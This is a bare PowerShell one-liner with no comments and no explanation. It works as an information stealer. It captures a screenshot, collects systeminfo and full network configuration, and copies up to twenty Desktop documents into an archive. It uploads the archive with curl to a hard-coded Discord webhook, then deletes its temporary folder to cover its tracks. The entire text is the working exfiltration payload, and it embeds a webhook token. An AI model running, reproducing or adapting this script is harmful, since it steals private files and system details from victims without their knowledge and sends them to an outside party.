$t="$env:TEMP\$(Get-Random)"; md $t; Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$b=New-Object System.Drawing.Bitmap $s.Width,$s.Height;$g=[System.Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);$b.Save("$t\s.png");$g.Dispose();$b.Dispose();systeminfo > "$t\sys.txt"; ipconfig /all > "$t\net.txt"; $u=[Environment]::GetFolderPath('Desktop'); if (Test-Path $u) { dir $u -Recurse -Include '*.doc*','*.xls*','*.pdf','*.txt' -ErrorAction SilentlyContinue | select -First 20 | copy -Dest "$t\docs\" -Force }; Compress-Archive -Path "$t\*" -DestinationPath "$t\data.zip"; curl -F "file=@$t\data.zip" https://discord.com/api/webhooks/1414478841853775943/kcGMtu7PIyl1prt3b47kdqDOrzRNlvKyPX6fpNAx39z0fVYi61a4DjiZUS7r-YQ1UtYD; rm -r $t -Force